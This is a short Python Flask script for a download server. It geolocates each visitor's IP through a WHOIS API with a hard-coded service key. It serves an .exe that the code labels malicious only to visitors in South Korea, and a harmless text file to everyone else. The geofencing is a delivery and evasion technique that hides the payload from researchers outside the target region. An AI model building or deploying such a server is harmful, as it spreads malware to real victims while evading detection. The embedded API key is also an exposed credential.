from flask import Flask, request, send_file
import requests
import os
import json

app = Flask(__name__)

malicious_file = os.environ.get("MALICIOUS_FILE_PATH", "./files/94fa80c133c152abe46e0f6f20c06b1f27c225f2723915596af2ad8499fa4ff0.exe")
none_malicious_file = os.environ.get("NONE_MALICIOUS_FILE_PATH", "./files/none_malicious_file.txt")

@app.route('/')
def home():
    remote_addr = request.remote_addr
    try:
        api_param = {
            "serviceKey": "WV8lzb2Hk0HQZV08PpT2CxFSCGm8Nz5cZURni1mvK+zd/72mRL9b68qKw7CmJxVCHM1QOrp1uR84YL8JuB4O+g==",
            "query": remote_addr,
            "answer": "json",
        }

        res = requests.get(url="http://apis.data.go.kr/B551505/whois/ipas_country_code", params=api_param, verify=False).json()

        response = res.get("response", {})
        whois = response.get("whois", {})
        country_code = whois.get("countryCode", None)
        
        print(f'[*] remote_addr: {remote_addr}, country: {country_code}')

        if not country_code or country_code == "none" or country_code != "KR":
            path = none_malicious_file

        else:
            path = malicious_file

    except json.JSONDecodeError:
        path = none_malicious_file
        print("Invalid JSON format.")
    
    except KeyError:
        path = none_malicious_file
        print("Key not found.")
    
    return send_file(path, as_attachment=True)

if __name__ == '__main__':

    print(f"[*] Malicious file is --> {malicious_file}")
    print(f"[*] None malicious file is --> {none_malicious_file}")
    
    app.run(host='0.0.0.0', port=80)